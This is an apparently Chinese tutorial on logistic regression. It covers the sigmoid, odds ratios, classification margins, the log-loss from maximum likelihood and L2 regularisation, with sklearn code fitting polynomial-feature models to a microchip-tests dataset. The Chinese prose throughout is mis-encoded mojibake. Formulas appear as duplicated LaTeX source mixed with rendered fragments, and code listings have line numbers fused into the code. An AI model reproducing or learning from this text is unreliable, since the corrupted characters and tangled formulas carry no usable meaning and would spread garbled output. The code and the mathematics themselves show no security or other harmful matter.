åŒºé—´å†…çš„æ¦‚ç‡ï¼Œé€»è¾‘å›å½’ä½¿ç”¨ä¸‹åˆ—å‡½æ•°è¿›è¡Œè½¬æ¢ï¼š Ïƒ(z)=11+expâ¡âˆ’z\\sigma(z) = \\frac{1}{1 + \\exp^{-z}} Ïƒ(z)=1+expâˆ’z1â€‹ ä½¿ç”¨ Matplotlib åº“ç”»å‡ºä¸Šé¢è¿™ä¸ªå‡½æ•°ã€‚ 12345678910111213141516import warningsimport numpy as npimport seaborn as snsfrom matplotlib import pyplot as plt%matplotlib inlinewarnings.filterwarnings(&#x27;ignore&#x27;)def sigma(z): return 1. / (1 + np.exp(-z))xx = np.linspace(-10, 10, 1000)plt.plot(xx, [sigma(x) for x in xx])plt.xlabel(&#x27;z&#x27;)plt.ylabel(&#x27;sigmoid(z)&#x27;)plt.title(&#x27;Sigmoid function&#x27;) äº‹ä»¶ XXX çš„æ¦‚ç‡è®°ä¸º P(X)P(X)P(X)ï¼Œåˆ™æ¯”å€¼æ¯” OR(X)OR(X)OR(X) ç”±å¼ P(X)1âˆ’P(X)\\frac{P(X)}{1-P(X)}1âˆ’P(X)P(X)â€‹ å†³å®šï¼Œæ¯”å€¼æ¯”æ˜¯æŸä¸€äº‹ä»¶æ˜¯å¦å‘ç”Ÿçš„æ¦‚ç‡ä¹‹æ¯”ã€‚æ˜¾ç„¶ï¼Œæ¦‚ç‡å’Œæ¯”å€¼æ¯”åŒ…å«åŒæ ·çš„ä¿¡æ¯ï¼Œä¸è¿‡ P(X)P(X)P(X) çš„èŒƒå›´æ˜¯ 0 åˆ° 1ï¼Œè€Œ OR(X)OR(X)OR(X) çš„èŒƒå›´æ˜¯ 0 åˆ° âˆ\\inftyâˆã€‚å¦‚æœè®¡ç®— OR(X)OR(X)OR(X) çš„å¯¹æ•°ï¼Œé‚£ä¹ˆæ˜¾ç„¶æœ‰ logâ¡OR(X)âˆˆR\\log{OR(X)} \\in \\mathbb{R}logOR(X)âˆˆRï¼Œè¿™åœ¨ OLS ä¸­æœ‰ç”¨åˆ°ã€‚ è®©æˆ‘ä»¬çœ‹çœ‹é€»è¾‘å›å½’æ˜¯å¦‚ä½•åšå‡ºé¢„æµ‹çš„ï¼š p+=P(yi=1âˆ£xi,w)p_+ = P\\left(y_i = 1 \\mid \\textbf{x}_\\text{i}, \\textbf{w}\\right) p+â€‹=P(yiâ€‹=1âˆ£xiâ€‹,w) ç°åœ¨ï¼Œå‡è®¾å·²ç»é€šè¿‡æŸç§æ–¹å¼å¾—åˆ°äº†æƒé‡ wwï¼Œå³æ¨¡å‹å·²ç»è®­ç»ƒå¥½äº†ï¼Œé€»è¾‘å›å½’é¢„æµ‹çš„æ­¥éª¤å¦‚ä¸‹ï¼š æ­¥éª¤ä¸€ è®¡ç®—ï¼š w0+w1x1+w2x2+...=wTxw_{0}+w_{1}x_1 + w_{2}x_2 + ... = \\textbf{w}^\\text{T}\\textbf{x} w0â€‹+w1â€‹x1â€‹+w2â€‹x2â€‹+...=wTx ç­‰å¼ wTx=0\\textbf{w}^\\text{T}\\textbf{x} = 0wTx=0 å®šä¹‰äº†ä¸€ä¸ªè¶…ç©ºé—´å°†æ ·æœ¬åˆ†ä¸ºä¸¤ç±»ã€‚ æ­¥éª¤äºŒ è®¡ç®—å¯¹æ•°æ¯”å€¼æ¯” OR+OR_{+}OR+â€‹ logâ¡(OR+)=wTx\\log(OR_{+}) = \\textbf{w}^\\text{T}\\textbf{x} log(OR+â€‹)=wTx æ­¥éª¤ä¸‰ ç°åœ¨å·²ç»æœ‰äº†å°†ä¸€ä¸ªæ ·æœ¬åˆ†é…åˆ°ã€Œ+ã€åˆ†ç±»çš„æ¦‚ç‡ OR+OR_{+}OR+â€‹ï¼Œå¯ä»¥æ®æ­¤è®¡ç®— p+p_{+}p+â€‹ï¼š p+=OR+1+OR+=expâ¡wTx1+expâ¡wTx=11+expâ¡âˆ’wTx=Ïƒ(wTx)p_{+} = \\frac{OR_{+}}{1 + OR_{+}} = \\frac{\\exp^{\\textbf{w}^\\text{T}\\textbf{x}}}{1 + \\exp^{\\textbf{w}^\\text{T}\\textbf{x}}} = \\frac{1}{1 + \\exp^{-\\textbf{w}^\\text{T}\\textbf{x}}} = \\sigma(\\textbf{w}^\\text{T}\\textbf{x}) p+â€‹=1+OR+â€‹OR+â€‹â€‹=1+expwTxexpwTxâ€‹=1+expâˆ’wTx1â€‹=Ïƒ(wTx) ä¸Šå¼çš„å³è¾¹å°±æ˜¯ sigmoid å‡½æ•°ã€‚ æ‰€ä»¥ï¼Œé€»è¾‘å›å½’é¢„æµ‹ä¸€ä¸ªæ ·æœ¬åˆ†é…ä¸ºã€Œ+ã€åˆ†ç±»çš„æ¦‚ç‡ï¼ˆå‡å®šå·²çŸ¥æ¨¡å‹çš„ç‰¹å¾å’Œæƒé‡ï¼‰ï¼Œè¿™ä¸€é¢„æµ‹è¿‡ç¨‹æ˜¯é€šè¿‡å¯¹æƒé‡å‘é‡å’Œç‰¹å¾å‘é‡çš„çº¿æ€§ç»„åˆè¿›è¡Œ sigmoid å˜æ¢å®Œæˆçš„ï¼Œå…¬å¼å¦‚ä¸‹ï¼š p+(xi)=P(yi=1âˆ£xi,w)=Ïƒ(wTxi).p_+(\\textbf{x}_\\text{i}) = P\\left(y_i = 1 \\mid \\textbf{x}_\\text{i}, \\textbf{w}\\right) = \\sigma(\\textbf{w}^\\text{T}\\textbf{x}_\\text{i}). p+â€‹(xiâ€‹)=P(yiâ€‹=1âˆ£xiâ€‹,w)=Ïƒ(wTxiâ€‹). ä¸‹é¢ä»‹ç»æ¨¡å‹æ˜¯å¦‚ä½•è¢«è®­ç»ƒçš„ï¼Œæˆ‘ä»¬å°†å†æ¬¡é€šè¿‡æœ€å¤§ä¼¼ç„¶ä¼°è®¡è®­ç»ƒæ¨¡å‹ã€‚ æœ€å¤§ä¼¼ç„¶ä¼°è®¡å’Œé€»è¾‘å›å½’ ç°åœ¨ï¼Œçœ‹ä¸‹ä»æœ€å¤§ä¼¼ç„¶ä¼°è®¡ï¼ˆMLEï¼‰å‡ºå‘å¦‚ä½•è¿›è¡Œé€»è¾‘å›å½’ä¼˜åŒ–ï¼Œä¹Ÿå°±æ˜¯æœ€å°åŒ–é€»è¾‘æŸå¤±å‡½æ•°ã€‚å‰é¢å·²ç»è§è¿‡äº†å°†æ ·æœ¬åˆ†é…ä¸ºã€Œ+ã€åˆ†ç±»çš„é€»è¾‘å›å½’æ¨¡å‹ï¼š p+(xi)=P(yi=1âˆ£xi,w)=Ïƒ(wTxi)p_+(\\textbf{x}_\\text{i}) = P\\left(y_i = 1 \\mid \\textbf{x}_\\text{i}, \\textbf{w}\\right) = \\sigma(\\textbf{w}^T\\textbf{x}_\\text{i}) p+â€‹(xiâ€‹)=P(yiâ€‹=1âˆ£xiâ€‹,w)=Ïƒ(wTxiâ€‹) ã€Œ-ã€åˆ†ç±»ç›¸åº”çš„è¡¨è¾¾å¼ä¸ºï¼š pâˆ’(xi)=P(yi=âˆ’1âˆ£xi,w)=1âˆ’Ïƒ(wTxi)=Ïƒ(âˆ’wTxi)p_-(\\textbf{x}_\\text{i}) = P\\left(y_i = -1 \\mid \\textbf{x}_\\text{i}, \\textbf{w}\\right) = 1 - \\sigma(\\textbf{w}^T\\textbf{x}_\\text{i}) = \\sigma(-\\textbf{w}^T\\textbf{x}_\\text{i}) pâˆ’â€‹(xiâ€‹)=P(yiâ€‹=âˆ’1âˆ£xiâ€‹,w)=1âˆ’Ïƒ(wTxiâ€‹)=Ïƒ(âˆ’wTxiâ€‹) è¿™ä¸¤ä¸ªè¡¨è¾¾å¼å¯ä»¥ç»„åˆæˆä¸€ä¸ªï¼š P(y=yiâˆ£xi,w)=Ïƒ(yiwTxi)P\\left(y = y_i \\mid \\textbf{x}_\\text{i}, \\textbf{w}\\right) = \\sigma(y_i\\textbf{w}^T\\textbf{x}_\\text{i}) P(y=yiâ€‹âˆ£xiâ€‹,w)=Ïƒ(yiâ€‹wTxiâ€‹) è¡¨è¾¾å¼ M(xi)=yiwTxiM(\\textbf{x}_\\text{i}) = y_i\\textbf{w}^T\\textbf{x}_\\text{i}M(xiâ€‹)=yiâ€‹wTxiâ€‹ ç§°ä¸ºç›®æ ‡ xi\\textbf{x}_\\text{i}xiâ€‹ çš„åˆ†ç±»è¾¹ç¼˜ã€‚å¦‚æœè¾¹ç¼˜éè´Ÿï¼Œåˆ™æ¨¡å‹æ­£ç¡®é€‰æ‹©äº†ç›®æ ‡ xi\\textbf{x}_\\text{i}xiâ€‹ çš„åˆ†ç±»ï¼›å¦‚æœè¾¹ç¼˜ä¸ºè´Ÿï¼Œåˆ™ç›®æ ‡ xi\\textbf{x}_\\text{i}xiâ€‹ è¢«é”™è¯¯åˆ†ç±»äº†ã€‚æ³¨æ„ï¼Œè¾¹ç¼˜ä»…é’ˆå¯¹è®­ç»ƒé›†ä¸­çš„ç›®æ ‡ï¼ˆå³æ ‡ç­¾ yiy_iyiâ€‹ å·²çŸ¥çš„ç›®æ ‡ï¼‰è€Œè¨€ã€‚ ä¸ºäº†å‡†ç¡®åœ°ç†è§£ä¸ºä½•æœ‰è¿™ä¸€ç»“è®ºï¼Œéœ€è¦ç†è§£å‘çº¿æ€§åˆ†ç±»å™¨çš„å‡ ä½•è§£é‡Šã€‚é¦–å…ˆï¼Œçœ‹ä¸‹çº¿æ€§ä»£æ•°çš„ä¸€ä¸ªç»å…¸å…¥é—¨é—®é¢˜ã€Œæ‰¾å‡ºå‘å¾„ xA\\textbf{x}_AxAâ€‹ ä¸å¹³é¢ wTx=0\\textbf{w}^\\text{T}\\textbf{x} = 0wTx=0 çš„è·ç¦»ã€ï¼Œå³ï¼š Ï(xA,wTx=0)=wTxAâˆ£âˆ£wâˆ£âˆ£\\rho(\\textbf{x}_A, \\textbf{w}^\\text{T}\\textbf{x} = 0) = \\frac{\\textbf{w}^\\text{T}\\textbf{x}_A}{||\\textbf{w}||} Ï(xAâ€‹,wTx=0)=âˆ£âˆ£wâˆ£âˆ£wTxAâ€‹â€‹ ç­”æ¡ˆï¼š ä»ç­”æ¡ˆä¸­ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œè¡¨è¾¾å¼ wTxi\\textbf{w}^\\text{T}\\textbf{x}_\\text{i}wTxiâ€‹ çš„ç»å¯¹å€¼è¶Šå¤§ï¼Œç‚¹ xi\\textbf{x}_\\text{i}xiâ€‹ ç¦»å¹³é¢ wTx=0\\textbf{w}^\\text{T}\\textbf{x} = 0wTx=0 çš„è·ç¦»å°±è¶Šè¿œã€‚ å› æ­¤ï¼Œè¡¨è¾¾å¼ M(xi)=yiwTxiM(\\textbf{x}_\\text{i}) = y_i\\textbf{w}^\\text{T}\\textbf{x}_\\text{i}M(xiâ€‹)=yiâ€‹wTxiâ€‹ æ˜¯æ¨¡å‹å¯¹ç›®æ ‡ xi\\textbf{x}_\\text{i}xiâ€‹ åˆ†ç±»çš„è‚¯å®šç¨‹åº¦ï¼š å¦‚æœè¾¹ç¼˜çš„ç»å¯¹å€¼è¾ƒå¤§ï¼Œä¸”ä¸ºæ­£å€¼ï¼Œé‚£ä¹ˆåˆ†ç±»çš„æ ‡ç­¾æ˜¯æ­£ç¡®çš„ï¼Œä¸”ç›®æ ‡ç¦»åˆ†ç•Œè¶…å¹³é¢å¾ˆè¿œï¼Œä¹Ÿå°±æ˜¯æ¨¡å‹å¯¹è¿™ä¸€åˆ†ç±»å¾ˆè‚¯å®šã€‚å¦‚ä¸‹å›¾ç‚¹ x3x_3x3â€‹ æ‰€ç¤ºã€‚ å¦‚æœè¾¹ç¼˜çš„ç»å¯¹å€¼è¾ƒå¤§ï¼Œä¸”ä¸ºè´Ÿå€¼ï¼Œé‚£ä¹ˆåˆ†ç±»çš„æ ‡ç­¾æ˜¯é”™è¯¯çš„ï¼Œä¸”ç›®æ ‡ç¦»åˆ†ç•Œè¶…å¹³é¢å¾ˆè¿œï¼Œé‚£ä¹ˆç›®æ ‡å¾ˆå¯èƒ½æ˜¯ä¸€ä¸ªå¼‚å¸¸å€¼ï¼ˆä¾‹å¦‚ï¼Œå®ƒå¯èƒ½ä¸ºè®­ç»ƒé›†ä¸­ä¸€ä¸ªé”™è¯¯æ ‡è®°çš„å€¼ï¼‰ã€‚å¦‚ä¸‹å›¾ç‚¹ x1x_1x1â€‹ æ‰€ç¤ºã€‚ å¦‚æœè¾¹ç¼˜ç»å¯¹å€¼è¾ƒå°ï¼Œé‚£ä¹ˆç›®æ ‡è·ç¦»åˆ†ç•Œè¶…å¹³é¢å¾ˆè¿‘ï¼Œå…¶ç¬¦å·å°±å†³å®šäº†ç›®æ ‡ã€Œæ˜¯å¦è¢«æ­£ç¡®åˆ†ç±»ã€ã€‚å¦‚ä¸‹å›¾ç‚¹ x2x_2x2â€‹ å’Œ x4x_4x4â€‹ æ‰€ç¤ºã€‚ ç°åœ¨ï¼Œè®¡ç®—æ•°æ®é›†çš„ä¼¼ç„¶ï¼Œå³åŸºäºæ•°æ®é›† x\\textbf{x}x è§‚æµ‹åˆ°ç»™å®šå‘é‡ y\\textbf{y}y çš„æ¦‚ç‡ã€‚å‡è®¾ç›®æ ‡æ¥è‡ªä¸€ä¸ªç‹¬ç«‹åˆ†å¸ƒï¼Œç„¶åå¯å»ºç«‹å¦‚ä¸‹å…¬å¼ï¼š P(yâˆ£X,w)=âˆi=1â„“P(y=yiâˆ£xi,w),P\\left(\\textbf{y} \\mid \\textbf{X}, \\textbf{w}\\right) = \\prod_{i=1}^{\\ell} P\\left(y = y_i \\mid \\textbf{x}_\\text{i}, \\textbf{w}\\right), P(yâˆ£X,w)=i=1âˆâ„“â€‹P(y=yiâ€‹âˆ£xiâ€‹,w), å…¶ä¸­ï¼Œâ„“â„“ ä¸ºæ•°æ®é›† XX çš„é•¿åº¦ï¼ˆè¡Œæ•°ï¼‰ã€‚ å¯¹è¿™ä¸ªè¡¨è¾¾å¼å–å¯¹æ•°ï¼Œç®€åŒ–è®¡ç®—ï¼š logâ¡P(yâˆ£X,w)=logâ¡âˆi=1â„“P(y=yiâˆ£xi,w)=logâ¡âˆi=1â„“Ïƒ(yiwTxi)=\\log P\\left(\\textbf{y} \\mid \\textbf{X}, \\textbf{w}\\right) = \\log \\prod_{i=1}^{\\ell} P\\left(y = y_i \\mid \\textbf{x}_\\text{i}, \\textbf{w}\\right) = \\log \\prod_{i=1}^{\\ell} \\sigma(y_i\\textbf{w}^\\text{T}\\textbf{x}_\\text{i}) = logP(yâˆ£X,w)=logi=1âˆâ„“â€‹P(y=yiâ€‹âˆ£xiâ€‹,w)=logi=1âˆâ„“â€‹Ïƒ(yiâ€‹wTxiâ€‹)= =âˆ‘i=1â„“logâ¡Ïƒ(yiwTxi)=âˆ‘i=1â„“logâ¡11+expâ¡âˆ’yiwTxi=âˆ’âˆ‘i=1â„“logâ¡(1+expâ¡âˆ’yiwTxi)= \\sum_{i=1}^{\\ell} \\log \\sigma(y_i\\textbf{w}^\\text{T}\\textbf{x}_\\text{i}) = \\sum_{i=1}^{\\ell} \\log \\frac{1}{1 + \\exp^{-y_i\\textbf{w}^\\text{T}\\textbf{x}_\\text{i}}} = - \\sum_{i=1}^{\\ell} \\log (1 + \\exp^{-y_i\\textbf{w}^\\text{T}\\textbf{x}_\\text{i}}) =i=1âˆ‘â„“â€‹logÏƒ(yiâ€‹wTxiâ€‹)=i=1âˆ‘â„“â€‹log1+expâˆ’yiâ€‹wTxiâ€‹1â€‹=âˆ’i=1âˆ‘â„“â€‹log(1+expâˆ’yiâ€‹wTxiâ€‹) æœ€å¤§åŒ–ä¼¼ç„¶ç­‰ä»·äºæœ€å°åŒ–ä»¥ä¸‹è¡¨è¾¾å¼ï¼š Llogâ¡(X,y,w)=âˆ‘i=1â„“logâ¡(1+expâ¡âˆ’yiwTxi).\\mathcal{L_{\\log}} (\\textbf X, \\textbf{y}, \\textbf{w}) = \\sum_{i=1}^{\\ell} \\log (1 + \\exp^{-y_i\\textbf{w}^\\text{T}\\textbf{x}_\\text{i}}). Llogâ€‹(X,y,w)=i=1âˆ‘â„“â€‹log(1+expâˆ’yiâ€‹wTxiâ€‹). ä¸Šå¼å°±æ˜¯é€»è¾‘æŸå¤±å‡½æ•°ã€‚ç”¨åˆ†ç±»è¾¹ç¼˜ M(xi)M(\\textbf{x}_\\text{i})M(xiâ€‹) æ”¹å†™é€»è¾‘æŸå¤±å‡½æ•°ï¼Œæœ‰ L(M)=logâ¡(1+expâ¡âˆ’M)L(M) = \\log (1 + \\exp^{-M})L(M)=log(1+expâˆ’M) å°†è¿™ä¸€å‡½æ•°çš„å›¾åƒå’Œ 0-1 æŸå¤±å‡½æ•°çš„å›¾åƒç»˜åˆ¶åœ¨ä¸€å¼ å›¾ä¸Šã€‚å½“é”™è¯¯åˆ†ç±»å‘ç”Ÿæ—¶ï¼Œ0-1 æŸå¤±å‡½æ•°åªä¼šä»¥æ’å®šçš„æ•°å€¼ 1.0 æƒ©ç½šæ¨¡å‹ï¼Œå³ L1/0(M)=[M&lt;0]L_{1/0}(M) = [M &lt; 0]L1/0â€‹(M)=[M&lt;0]ã€‚ ä¸Šå›¾ä½“ç°äº†è¿™æ ·ä¸€ä¸ªæƒ³æ³•ï¼šå¦‚æœä¸èƒ½å¤Ÿç›´æ¥æœ€å°åŒ–åˆ†ç±»é—®é¢˜çš„è¯¯å·®æ•°é‡ï¼ˆè‡³å°‘æ— æ³•é€šè¿‡æ¢¯åº¦æ–¹æ³•æœ€å°åŒ–ï¼Œå› ä¸º 0-1 æŸå¤±å‡½æ•°åœ¨ 0 çš„å¯¼æ•°è¶‹å‘æ— ç©·ï¼‰ï¼Œé‚£ä¹ˆå¯ä»¥è½¬è€Œæœ€å°åŒ–å®ƒçš„ä¸Šç•Œã€‚å¯¹é€»è¾‘æŸå¤±å‡½æ•°è€Œè¨€ï¼Œä»¥ä¸‹å…¬å¼æ˜¯æˆç«‹çš„ï¼š L1/0(X,y,w)=âˆ‘i=1â„“[M(xi)&lt;0]â‰¤âˆ‘i=1â„“logâ¡(1+expâ¡âˆ’yiwTxi)=Llogâ¡(X,y,w),\\mathcal{L_{1/0}} (\\textbf X, \\textbf{y}, \\textbf{w}) = \\sum_{i=1}^{\\ell} [M(\\textbf{x}_\\text{i}) &lt; 0] \\leq \\sum_{i=1}^{\\ell} \\log (1 + \\exp^{-y_i\\textbf{w}^\\text{T}\\textbf{x}_\\text{i}}) = \\mathcal{L_{\\log}} (\\textbf X, \\textbf{y}, \\textbf{w}), L1/0â€‹(X,y,w)=i=1âˆ‘â„“â€‹[M(xiâ€‹)&lt;0]â‰¤i=1âˆ‘â„“â€‹log(1+expâˆ’yiâ€‹wTxiâ€‹)=Llogâ€‹(X,y,w), å…¶ä¸­ L1/0(X,y)\\mathcal{L_{1/0}} (\\textbf X, \\textbf{y})L1/0â€‹(X,y) åªæ˜¯æ•°æ®é›†ï¼ˆX,yï¼‰ï¼ˆ\\textbf X, \\textbf{y}ï¼‰ï¼ˆX,yï¼‰ ä¸Šæƒé‡ w\\textbf{w}w çš„é€»è¾‘å›å½’è¯¯å·®ã€‚å› æ­¤ï¼Œå¯ä»¥é€šè¿‡é™ä½åˆ†ç±»è¯¯å·®æ•° Llog\\mathcal{L_{log}}Llogâ€‹ çš„ä¸Šé™ï¼Œé™ä½åˆ†æ•°è¯¯å·®æ•°æœ¬èº«ã€‚ é€»è¾‘å›å½’çš„ l2l_2l2â€‹æ­£åˆ™åŒ– é€»è¾‘å›å½’çš„ L2 æ­£åˆ™åŒ–å’Œå²­å›å½’çš„æƒ…å†µåŸºæœ¬ä¸€æ ·ã€‚ä»£æ›¿ Llogâ¡(X,y,w)\\mathcal{L_{\\log}} (\\textbf X, \\textbf{y}, \\textbf{w})Llogâ€‹(X,y,w)ï¼Œåªç”¨æœ€å°åŒ–ä¸‹å¼ï¼š J(X,y,w)=Llogâ¡(X,y,w)+Î»âˆ£wâˆ£2\\mathcal{J}(\\textbf X, \\textbf{y}, \\textbf{w}) = \\mathcal{L_{\\log}} (\\textbf X, \\textbf{y}, \\textbf{w}) + \\lambda |\\textbf{w}|^2 J(X,y,w)=Llogâ€‹(X,y,w)+Î»âˆ£wâˆ£2 åœ¨é€»è¾‘å›å½’ä¸­ï¼Œé€šå¸¸ä½¿ç”¨æ­£åˆ™åŒ–ç³»æ•°çš„å€’æ•° C=1Î»C = \\frac{1}{\\lambda}C=Î»1â€‹ï¼š w^=argâ¡minâ¡wJ(X,y,w)=argâ¡minâ¡w (Câˆ‘i=1â„“logâ¡(1+expâ¡âˆ’yiwTxi)+âˆ£wâˆ£2)\\widehat{\\textbf w} = \\arg \\min_{\\textbf{w}} \\mathcal{J}(\\textbf X, \\textbf{y}, \\textbf{w}) = \\arg \\min_{\\textbf{w}}\\ (C\\sum_{i=1}^{\\ell} \\log (1 + \\exp^{-y_i\\textbf{w}^\\text{T}\\textbf{x}_\\text{i}})+ |\\textbf{w}|^2) w=argwminâ€‹J(X,y,w)=argwminâ€‹ (Ci=1âˆ‘â„“â€‹log(1+expâˆ’yiâ€‹wTxiâ€‹)+âˆ£wâˆ£2) ä¸‹é¢é€šè¿‡ä¸€ä¸ªä¾‹å­ç›´è§‚åœ°ç†è§£æ­£åˆ™åŒ–ã€‚ é€»è¾‘å›å½’æ­£åˆ™åŒ–ç¤ºä¾‹ æ­£åˆ™åŒ–æ˜¯å¦‚ä½•å½±å“åˆ†ç±»è´¨é‡çš„å‘¢ï¼Ÿæˆ‘ä»¬ä½¿ç”¨å´æ©è¾¾æœºå™¨å­¦ä¹ è¯¾ç¨‹ä¸­çš„ã€Œå¾®èŠ¯ç‰‡æµ‹è¯•ã€æ•°æ®é›†ï¼Œè¿ç”¨åŸºäºå¤šé¡¹å¼ç‰¹å¾çš„é€»è¾‘å›å½’æ–¹æ³•ï¼Œç„¶åæ”¹å˜æ­£åˆ™åŒ–å‚æ•° ğ¶Cã€‚é¦–å…ˆï¼Œçœ‹çœ‹æ­£åˆ™åŒ–æ˜¯å¦‚ä½•å½±å“åˆ†ç±»å™¨çš„åˆ†ç•Œï¼Œå¹¶æŸ¥çœ‹æ¬ æ‹Ÿåˆå’Œè¿‡æ‹Ÿåˆçš„æƒ…å†µã€‚æ¥ç€ï¼Œå°†é€šè¿‡äº¤å‰éªŒè¯å’Œç½‘æ ¼æœç´¢æ–¹æ³•æ¥é€‰æ‹©æ¥è¿‘æœ€ä¼˜å€¼çš„æ­£åˆ™åŒ–å‚æ•°ã€‚ 12345678910from sklearn.model_selection import GridSearchCVfrom sklearn.model_selection import cross_val_score, StratifiedKFoldfrom sklearn.linear_model import LogisticRegression, LogisticRegressionCVfrom sklearn.preprocessing import PolynomialFeaturesimport pandas as pdimport numpy as npimport seaborn as snsfrom matplotlib import pyplot as plt%matplotlib inline ä½¿ç”¨ Pandas åº“çš„ read_csv() æ–¹æ³•åŠ è½½æ•°æ®ã€‚è¿™ä¸ªæ•°æ®é›†å†…æœ‰ 118 ä¸ªå¾®èŠ¯ç‰‡ï¼ˆç›®æ ‡ï¼‰ï¼Œå…¶ä¸­æœ‰ä¸¤é¡¹è´¨é‡æ§åˆ¶æµ‹è¯•çš„ç»“æœï¼ˆä¸¤ä¸ªæ•°å€¼å˜é‡ï¼‰å’Œå¾®èŠ¯ç‰‡æ˜¯å¦æŠ•äº§çš„ä¿¡æ¯ã€‚å˜é‡å·²ç»è¿‡å½’ä¸€åŒ–ï¼Œå³åˆ—ä¸­çš„å€¼å·²ç»å‡å»å…¶å‡å€¼ã€‚æ‰€ä»¥ï¼Œå¾®èŠ¯ç‰‡çš„å¹³å‡æµ‹è¯•å€¼ä¸ºé›¶ã€‚ 12345# è¯»å–æ•°æ®é›†data = pd.read_csv(&#x27;https://labfile.oss.aliyuncs.com/courses/1283/microchip_tests.txt&#x27;, header=None, names=(&#x27;test1&#x27;, &#x27;test2&#x27;, &#x27;released&#x27;))# æŸ¥çœ‹æ•°æ®é›†çš„ä¸€äº›ä¿¡æ¯data.info() æŸ¥çœ‹å¼€å§‹äº”è¡Œå’Œæœ€åäº”è¡Œçš„æ•°æ®ã€‚ 123data.head(5)data.tail(5) åˆ†ç¦»è®­ç»ƒé›†å’Œç›®æ ‡åˆ†ç±»æ ‡ç­¾ã€‚ 12X = data.iloc[:, :2].valuesy = data.iloc[:, 2].values ç»˜åˆ¶æ•°æ®ï¼Œæ©™ç‚¹å¯¹åº”æœ‰ç¼ºé™·çš„èŠ¯ç‰‡ï¼Œè“ç‚¹å¯¹åº”æ­£å¸¸èŠ¯ç‰‡ã€‚ 123456plt.scatter(X[y == 1, 0], X[y == 1, 1], c=&#x27;blue&#x27;, label=&#x27;Released&#x27;)plt.scatter(X[y == 0, 0], X[y == 0, 1], c=&#x27;orange&#x27;, label=&#x27;Faulty&#x27;)plt.xlabel(&quot;Test 1&quot;)plt.ylabel(&quot;Test 2&quot;)plt.title(&#x27;2 tests of microchips. Logit with C=1&#x27;)plt.legend() å®šä¹‰ä¸€ä¸ªå‡½æ•°æ¥æ˜¾ç¤ºåˆ†ç±»å™¨çš„åˆ†ç•Œçº¿ã€‚ 12345678910def plot_boundary(clf, X, y, grid_step=.01, poly_featurizer=None): x_min, x_max = X[:, 0].min() - .1, X[:, 0].max() + .1 y_min, y_max = X[:, 1].min() - .1, X[:, 1].max() + .1 xx, yy = np.meshgrid(np.arange(x_min, x_max, grid_step), np.arange(y_min, y_max, grid_step)) # åœ¨ [x_min, m_max]x[y_min, y_max] çš„æ¯ä¸€ç‚¹éƒ½ç”¨å®ƒè‡ªå·±çš„é¢œè‰²æ¥å¯¹åº” Z = clf.predict(poly_featurizer.transform(np.c_[xx.ravel(), yy.ravel()])) Z = Z.reshape(xx.shape) plt.contour(xx, yy, Z, cmap=plt.cm.Paired) ä¸ºä¸¤ä¸ªå˜é‡ ğ‘¥1x1 å’Œ ğ‘¥2x2 å®šä¹‰å¦‚ä¸‹å¤šå½¢å¼ç‰¹å¾ï¼š {x1d,x1dâˆ’1x2,â€¦x2d}={x1ix2j}i+j=d,i,jâˆˆN\\{x_1^d, x_1^{d-1}x_2, \\ldots x_2^d\\} = \\{x_1^ix_2^j\\}_{i+j=d, i,j \\in \\mathbb{N}} {x1dâ€‹,x1dâˆ’1â€‹x2â€‹,â€¦x2dâ€‹}={x1iâ€‹x2jâ€‹}i+j=d,i,jâˆˆNâ€‹ ä¾‹å¦‚ï¼Œğ‘‘=3d=3 æ—¶çš„ç‰¹å¾å¦‚ä¸‹ï¼š 1,x1,x2,x12,x1x2,x22,x13,x12x2,x1x22,x231, x_1, x_2, x_1^2, x_1x_2, x_2^2, x_1^3, x_1^2x_2, x_1x_2^2, x_2^3 1,x1â€‹,x2â€‹,x12â€‹,x1â€‹x2â€‹,x22â€‹,x13â€‹,x12â€‹x2â€‹,x1â€‹x22â€‹,x23â€‹ ç‰¹å¾çš„æ•°é‡ä¼šå‘ˆæŒ‡æ•°å‹å¢é•¿ï¼Œä¸º 100 ä¸ªå˜é‡åˆ›å»º d è¾ƒå¤§ï¼ˆä¾‹å¦‚ ğ‘‘=10d=10ï¼‰çš„å¤šé¡¹å¼ç‰¹å¾ä¼šå¯¼è‡´è®¡ç®—æˆæœ¬å˜å¾—å¾ˆé«˜ã€‚ ä½¿ç”¨ sklearn åº“æ¥å®ç°é€»è¾‘å›å½’ã€‚åˆ›å»ºä¸€ä¸ªå¯¹è±¡ï¼Œä¸ºçŸ©é˜µ ğ‘‹X åŠ ä¸Šå¤šé¡¹å¼ç‰¹å¾ï¼ˆğ‘‘d ä¸è¶…è¿‡7ï¼‰ã€‚ 1234poly = PolynomialFeatures(degree=7)X_poly = poly.fit_transform(X)X_poly.shape è®­ç»ƒé€»è¾‘å›å½’æ¨¡å‹ï¼Œæ­£åˆ™åŒ–ç³»æ•° ğ¶=10âˆ’2C=10âˆ’2ã€‚ 12345678910111213141516C = 1e-2logit = LogisticRegression(C=C, random_state=17)logit.fit(X_poly, y)plot_boundary(logit, X, y, grid_step=.01, poly_featurizer=poly)plt.scatter(X[y == 1, 0], X[y == 1, 1], c=&#x27;blue&#x27;, label=&#x27;Released&#x27;)plt.scatter(X[y == 0, 0], X[y == 0, 1], c=&#x27;orange&#x27;, label=&#x27;Faulty&#x27;)plt.xlabel(&quot;Test 1&quot;)plt.ylabel(&quot;Test 2&quot;)plt.title(&#x27;2 tests of microchips. Logit with C=%s&#x27; % C)plt.legend()print(&quot;Accuracy on training set:&quot;, round(logit.score(X_poly, y), 3)) å¯ä»¥å°è¯•å‡å°æ­£åˆ™åŒ–ï¼Œå³æŠŠ ğ¶C å¢åŠ åˆ° 1ï¼Œç°åœ¨çš„æ¨¡å‹æƒé‡å¯ä»¥æ¯”ä¹‹å‰æœ‰æ›´å¤§çš„å€¼ï¼ˆç»å¯¹å€¼æ›´å¤§ï¼‰ï¼Œè¿™ä½¿å¾—åˆ†ç±»å™¨åœ¨è®­ç»ƒé›†ä¸Šçš„ç²¾ç¡®åº¦æé«˜åˆ° 0.831ã€‚ 12345678910111213141516C = 1logit = LogisticRegression(C=C, random_state=17)logit.fit(X_poly, y)plot_boundary(logit, X, y, grid_step=.005, poly_featurizer=poly)plt.scatter(X[y == 1, 0], X[y == 1, 1], c=&#x27;blue&#x27;, label=&#x27;Released&#x27;)plt.scatter(X[y == 0, 0], X[y == 0, 1], c=&#x27;orange&#x27;, label=&#x27;Faulty&#x27;)plt.xlabel(&quot;Test 1&quot;)plt.ylabel(&quot;Test 2&quot;)plt.title(&#x27;2 tests of microchips. Logit with C=%s&#x27; % C)plt.legend()print(&quot;Accuracy on training set:&quot;, round(logit.score(X_poly, y), 3)) 